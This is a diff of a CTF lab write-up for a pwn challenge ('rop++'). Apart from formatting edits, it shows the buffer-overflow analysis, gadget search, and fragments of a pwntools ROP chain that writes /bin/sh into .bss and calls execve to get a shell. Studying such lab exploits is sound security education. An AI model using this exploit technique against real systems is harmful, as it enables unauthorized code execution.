@@ -13,7 +13,7 @@ date: 2023-01-29
 challenge: `nc edu-ctf.zoolab.org 10004`
 
 ## Original Code
-```cpp!=
+```cpp
 #include <stdio.h>
 #include <unistd.h>
 #include <string.h>
@@ -29,14 +29,14 @@ int main()
     return 0;
 }
 ```
-```makefile!
+```makefile
 gcc -fno-stack-protector -static -o chal rop++.c
 ```
 
 ## Analyze
 * Obviously buffer overflow!!!
 * Check protector
-    ```bash!
+    ```bash
     $ checksec chal
     [*] '/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal'
         Arch:     amd64-64-little
@@ -48,7 +48,7 @@ gcc -fno-stack-protector -static -o chal rop++.c
 
 * Preliminary idea is using `ROP` chain and get shell, but the problem is where can I write `/bin/sh\x00`? We can use `vmmap` to observe where section is writable and readable → `0x4c5000~0x4c800`
 ![](https://imgur.com/018Nk8F.png)
-    ```bash!
+    ```bash
     $ readelf -S chal
     ...
     [25] .bss              NOBITS           00000000004c72a0  000c6290
@@ -60,7 +60,7 @@ gcc -fno-stack-protector -static -o chal rop++.c
 
 ## Exploit - `ROP`
 1. Write `ROP` chain in `buf` parameter
-    ```bash!
+    ```bash
     $ ROPgadget --binary chal --only "pop|leave|ret|syscall" --multibr > rop_gadget
     $ vim rop_gadget
     ```
@@ -74,7 +74,7 @@ gcc -fno-stack-protector -static -o chal rop++.c
     ```
 2. Construct `ROP` chain
 In order to achieve our idea, we need another read to write `/bin/sh\x00` to `.bss` section
-    ```python!
+    ```python
     ROP_read = flat(
         # call read function
         pop_rax_ret, 0,
@@ -85,7 +85,7 @@ In order to achieve our idea, we need another read to write `/bin/sh\x00` to `.b
     )
     ```
     Then we need another `ROP` chain to call `shell`
-    ```python!
+    ```python
     ROP_shell = flat(
         # Get shell
         pop_rax_ret, 0x3b,
@@ -98,7 +98,7 @@ In order to achieve our idea, we need another read to write `/bin/sh\x00` to `.b
     ```
     * Note that `0x4c72a0` is the beginning of `.bss` section
 3. Send payload
-    ```python!
+    ```python
     binsh = 0x68732f6e69622f #'/bin/sh\x00'
     r.sendafter("show me rop\n>", b'a'*0x28 + ROP_read + ROP_shell)
     r.send(flat(binsh))
@@ -106,8 +106,7 @@ In order to achieve our idea, we need another read to write `/bin/sh\x00` to `.b
 4. Then we get shell and read flag
 ![](https://imgur.com/mLAdXz1.png)
 * Whole exploit
-    :::spoiler code
-    ```python!
+    ```python
     from pwn import *
 
     #r = process('./chal')
@@ -148,7 +147,6 @@ In order to achieve our idea, we need another read to write `/bin/sh\x00` to `.b
 
     r.interactive()
     ```
-    :::
 
 ## Appendix
 This payload will call `sys_read` and read something that we send, that is `0x68732f6e69622f`(`/bin/sh\x00`), and then it'll call `sys_execve`.
